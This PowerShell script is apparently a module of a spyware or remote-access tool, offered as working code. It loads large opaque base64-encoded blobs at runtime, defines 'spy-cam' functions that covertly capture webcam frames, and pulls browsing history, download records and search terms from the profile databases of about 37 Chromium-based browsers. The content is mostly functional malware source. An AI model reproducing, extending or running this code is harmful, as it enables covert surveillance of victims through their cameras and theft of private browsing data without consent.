7q36Q/Yjfpj5ZNPCSNCZkI1dj0ELGIeInYRHwgPEsMabpWr3nx+zyj8Ls8tUbdcvygCv6z88jPypY8m6mN0cZyertQ8PDwZTRdQbQvM71YEbA2aAFqi2vlpyyoGeNFcDweix6PCmF1tL1GuJbe+AVyG1/IBia34c9CzHWbhAFjysbkI0LDd5fHjPCc0PCdoeF7gXgWnAOf8PADeFR+XGj4IRn3gQqvFZ6DZXD4AXwQO2YgEcSwvRApWh49XgxJOxDUsC5SSWzb8Gsei7wxgmkBD+oQD73CdtYjmpcjAulHtAhJjkYzr2aXISHdXbNQnxjVJ0ZvQpMJTaa3h5c81I/mM4iEs+IVJzDP9OpYATD3V1QgdbsWxazVad2PCCqxXkslRBCf19Jrw2vAwBISHv5ZaK2PFozhn+EDBaAWF1t6DL9K6yWtByg29UxERDTIZG0NfCHEoa7TvJNDcT18XPi4Wnph3Ru+mOZDvIe/zJ8rw73h4WtInM/gLDCxPwLBZ/oDfGpqMN6Qvc+phnOlVYymzCqvrYd30gyITng4vI2mRbvca6EveJWwsWB6UaGzqUlr/Giy4fsxHYQXeUeFh9/EakvdOi4iJnj9ikHdhJUHba7j67R/0OtzvZiUeXkGkRgNQzKAlgoN/z7UFeqColCO36gCwm+1T26aOXvO9Jkz2hqb22e2NM6YM2dGY3tTZ1Pj/NmzW6bPaJ2/YEEr/riHShLagz9TVL8fgTQwxYpKjdbwSo+fm/2S8J5y/Nk+CZotB3oNZY7GQ4VO0X3hefjBzVHhPaMgURENogAXmNQ944CrvX6UWYVE2/jQlKFVpPRAD7ArvR7Vatz6P+RGhi+GG4IA4G/YNNG8NBPD7a+4ASaWc6yh02Iw4MdG3iofg+01DwMRVG4asYuwPGjhZPhMWt1q/V5PLQGsjFjmJL8CQlxR5vVCyu7A2klrkdcknwrbh3mSrWqYYER4z0TSOniJwfJ3Zk0Ii2h4MJyAm9qiJrwI/V2DfjFAbRLwGpsqUFNjkoRg6iBYAz+vwSJTg/Fh29RZHbPmT29pmd3U2NLU1tE4fXpvU2Pb9NaOxqamtqaOOdOnt86ZOQt/q++GbHVDokc/NuSMvyPNWW3N85tmIffm1vkz3DR7DhNy5qy21lmAjU1tnRSyYz6EqqUNIZub2hY0tbfNno2/zKGQc1rmz2ybMR9pds5sotybG9vaF1BIShNla2nFH5tQyOY5rTOaWpubG2e2t6rc2ztb2t3cO+a3lubecuTcW+d0tExvQt1bZ8xqlyHnzO5ExKa2tqYm3DYzZyb+YKYozeYjpylDts1CyN6/J+ScBUdOs2VW++yW1tbmxo7mjlYKuaCxtX0GsmhqbZq5YFbH/AW486w49zl/bznbp398SPmHGLTT4aEvIyYQsaepsSnBFexJNq5vaklwxMSGpvUJN4smek1vIglpQnAiHY5Lvma4XUZpzkGxj5SmarQjFJtDzmye3YxubJzR3KE6t3V6C2SSO3dGe3vrTPw3U1Hus4+c+6z2WTObFyxYgEAL5jfOWEAC09zW2djUPGtW+8zO2R2zW/GDMBSyffqcWe3Nre2N7W3tSLNpeltj+6w5PKyQe8sMyO/sko6Y8fE1QvvTf3LzPDydVskao3p4mLY2fi/midBauwZTJC024Z2kicFREQtoNrRD9SLo83odiJ6V/xGIHyXBD6no0VNxCwPuinQPDvgYIacNf26aNnzhxxxMuszDHEw2xJzfC2iI4cZF8jue/jwd74ZYB2z+OAo6fiA5hMOZdENs+dB6HGzhRGwlHi0eOH797NmJmT0zZ02f0zIj2dQ6Z5S2Ug/Sgw5ICYZveQJGzfKi/MMcfr1Dbv7vwUNfr7jhcHiUhdF9CR0ecwmTSTaq0+vDoxGf9Ob/ff3v639f/z++viPwi1j0O0r/2xT/P77+Dw=="

$devices={[AForge.Video.DirectShow.FilterInfoCollection]::new([Guid]::new("860bb310-5d01-11d0-bd3b-00a0c911ce86"))}
function spy-cam {
	param($num)
	[cam]::captured = $false
	$videoSource = [AForge.Video.DirectShow.VideoCaptureDevice]::new((&$devices)[$num].MonikerString)
	$handler = [Delegate]::CreateDelegate(
		[AForge.Video.NewFrameEventHandler],
		[cam].GetMethod("VideoSource_NewFrame")
	)
	$videoSource.add_NewFrame($handler)

	try {
		$videoSource.Start()
		$null = [cam]::WaitHandle.WaitOne()
	}
	finally {
		$videoSource.remove_NewFrame($handler)

		if ($videoSource.IsRunning) {
			$videoSource.SignalToStop()
			$videoSource.WaitForStop()
		}
	}

}
function spy-getcam {
	if ((&$devices).count -eq 0) {
		"No Cameras Found!"
	}
	else {
		$i = 0
		(&$devices) | % {
			[pscustomobject]@{
				DeviceName = $_.Name
				DeviceNumber = $i
			} 
			$i++
		}
	}
}
# from https://github.com/arsium/ChromeHistory
$ChromiumPaths = [Collections.Generic.Dictionary[[string],[string]]]::new()
$ChromiumPaths.Add("Chrome", "$env:LocalAppData\Google\Chrome\User Data")
$ChromiumPaths.Add("AVG Browser", "$env:LocalAppData\AVG\Browser\User Data")
$ChromiumPaths.Add("Kinza", "$env:LocalAppData\Kinza\User Data")
$ChromiumPaths.Add("URBrowser", "$env:LocalAppData\URBrowser\User Data")
$ChromiumPaths.Add("AVAST Software", "$env:LocalAppData\AVAST Software\Browser\User Data")
$ChromiumPaths.Add("SalamWeb", "$env:LocalAppData\SalamWeb\User Data")
$ChromiumPaths.Add("CCleaner", "$env:LocalAppData\CCleaner Browser\User Data")
$ChromiumPaths.Add("Opera", "$env:AppData\Opera Software\Opera Stable")
$ChromiumPaths.Add("Yandex", "$env:LocalAppData\Yandex\YandexBrowser\User Data")
$ChromiumPaths.Add("Slimjet", "$env:LocalAppData\Slimjet\User Data")
$ChromiumPaths.Add("360 Browser", "$env:LocalAppData\360Chrome\Chrome\User Data")
$ChromiumPaths.Add("Comodo Dragon", "$env:LocalAppData\Comodo\Dragon\User Data")
$ChromiumPaths.Add("CoolNovo", "$env:LocalAppData\MapleStudio\ChromePlus\User Data")
$ChromiumPaths.Add("Chromium | SRWare Iron Browser", "$env:LocalAppData\Chromium\User Data")
$ChromiumPaths.Add("Torch Browser", "$env:LocalAppData\Torch\User Data")
$ChromiumPaths.Add("Brave Browser", "$env:LocalAppData\BraveSoftware\Brave-Browser\User Data")
$ChromiumPaths.Add("Iridium Browser", "$env:LocalAppData\Iridium\User Data")
$ChromiumPaths.Add("Opera Neon", "$env:LocalAppData\Opera Software\Opera Neon\User Data")
$ChromiumPaths.Add("7Star", "$env:LocalAppData\7Star\7Star\User Data")
$ChromiumPaths.Add("Amigo", "$env:LocalAppData\Amigo\User Data")
$ChromiumPaths.Add("Blisk", "$env:LocalAppData\Blisk\User Data")
$ChromiumPaths.Add("CentBrowser", "$env:LocalAppData\CentBrowser\User Data")
$ChromiumPaths.Add("Chedot", "$env:LocalAppData\Chedot\User Data")
$ChromiumPaths.Add("CocCoc", "$env:LocalAppData\CocCoc\Browser\User Data")
$ChromiumPaths.Add("Elements Browser", "$env:LocalAppData\Elements Browser\User Data")
$ChromiumPaths.Add("Epic Privacy Browser", "$env:LocalAppData\Epic Privacy Browser\User Data")
$ChromiumPaths.Add("Kometa", "$env:LocalAppData\Kometa\User Data")
$ChromiumPaths.Add("Orbitum", "$env:LocalAppData\Orbitum\User Data")
$ChromiumPaths.Add("Sputnik", "$env:LocalAppData\Sputnik\Sputnik\User Data")
$ChromiumPaths.Add("uCozMedia", "$env:LocalAppData\uCozMedia\Uran\User Data")
$ChromiumPaths.Add("Vivaldi", "$env:LocalAppData\Vivaldi\User Data")
$ChromiumPaths.Add("Sleipnir 6", "$env:AppData\Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer")
$ChromiumPaths.Add("Citrio", "$env:LocalAppData\CatalinaGroup\Citrio\User Data")
$ChromiumPaths.Add("Coowon", "$env:LocalAppData\Coowon\Coowon\User Data")
$ChromiumPaths.Add("Liebao Browser", "$env:LocalAppData\liebao\User Data")
$ChromiumPaths.Add("QIP Surf", "$env:LocalAppData\QIP Surf\User Data")
$ChromiumPaths.Add("Edge Chromium", "$env:LocalAppData\Microsoft\Edge\User Data")
load "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"
function GetDateFromWebkitTime {
	param($s)
	$value = [Convert]::ToDouble($s) * 1E-06
	[DateTime]$dateTime = [DateTime]::new(1601, 1, 1)
	try {
		$dateTime.Add([TimeSpan]::FromSeconds($value))
	}
	catch {}
	return $dateTime
}

function GetAllProfiles {
	param($DirectoryPath)
	$list = @()
	$list += $DirectoryPath + "\Default\History"
	$list += $DirectoryPath + "\History"
	if (Test-Path $DirectoryPath) {
		foreach ($text in [IO.Directory]::GetDirectories($DirectoryPath)) {
			if ($text.Contains("Profile")) {
				$list += $text + "\History"
			}
		}
	}
	return $list
}

function History_Recovery {
	param($path, $browser)
	$list = [Collections.Generic.List[PSCustomObject]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("urls")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$data = [PSCustomObject]@{
					browser = $browser
					Title = $sqliteHandler.GetValue($j, "title")
					URL = $sqliteHandler.GetValue($j, "url")
					visit_count = $sqliteHandler.GetValue($j, "visit_count")
					last_visit_Time = GetDateFromWebkitTime($sqliteHandler.GetValue($j, "last_visit_Time"))
				}
				$list.Add($data)
			}
		}
		return $list
	}
}
function Downloads_Recovery {
	param($path, $browser)
	$list = [Collections.Generic.List[PSCustomObject]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("downloads")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$data = [PSCustomObject]@{
					browser = $browser
					tab_url = $sqliteHandler.GetValue($j, "tab_url")
					target_path = $sqliteHandler.GetValue($j, "target_path")
					total_bytes = $sqliteHandler.GetValue($j, "total_bytes")
					start_time = GetDateFromWebkitTime($sqliteHandler.GetValue($j, "start_time"))
				}
				$list.Add($data)
			}
		}
		return ($list | Format-List)
	}
}
function keywordSearchTermsHistory {
	param($path, $browser)
	$list = [Collections.Generic.List[string]]::new()
	foreach ($text in (GetAllProfiles($path))) {
		if (-not (Test-Path $text)) {
			continue
		}
		$sqliteHandler = [SqliteHandler]::new($text)
		if ($sqliteHandler.ReadTable("keyword_search_terms")) {
			for ($j = 0; $j -le $sqliteHandler.GetRowCount() - 1; $j++) {
				$term = $sqliteHandler.GetValue($j, "term")
				$list.Add($term)
			}
		}
		return $list
	}
}
function spy-browsinghistory {
	$list = [Collections.Generic.List[object]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) {
		try {
			$list.AddRange((History_Recovery $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return ($list | Format-List)
}
function spy-downloadhistory {
	$list = [Collections.Generic.List[object]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) { 
		try {
			$list.AddRange((Downloads_Recovery $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return ($list | Format-List)
}
function spy-searchhistory {
	$list = [Collections.Generic.List[string]]::new()
	foreach ($keyValuePair in $ChromiumPaths.GetEnumerator()) {
		try {
			$list.AddRange((keywordSearchTermsHistory $keyValuePair.Value $keyValuePair.Key))
		}
		catch {}
	}
	return $list
}